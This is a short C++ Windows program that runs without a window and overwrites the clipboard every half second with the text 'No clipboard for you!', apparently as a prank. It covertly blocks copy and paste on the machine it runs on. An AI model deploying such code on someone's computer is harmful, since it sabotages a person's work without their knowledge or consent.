#define UNICODE
#define _UNICODE

#include <windows.h>
#include <thread>

// Text that will replace everything in clipboard
const wchar_t* BLOCK_TEXT = L"No clipboard for you!";

// Function to force clipboard text
void ForceClipboardText()
{
    if (!OpenClipboard(NULL))
        return;

    EmptyClipboard();

    size_t size = (wcslen(BLOCK_TEXT) + 1) * sizeof(wchar_t);
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, size);
    if (hMem)
    {
        void* ptr = GlobalLock(hMem);
        memcpy(ptr, BLOCK_TEXT, size);
        GlobalUnlock(hMem);

        SetClipboardData(CF_UNICODETEXT, hMem);
    }

    CloseClipboard();
}

// Entry point of Windows application
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    while (true)
    {
        ForceClipboardText();
        Sleep(500);   // repeat every 0.5 second
    }
    return 0;
}
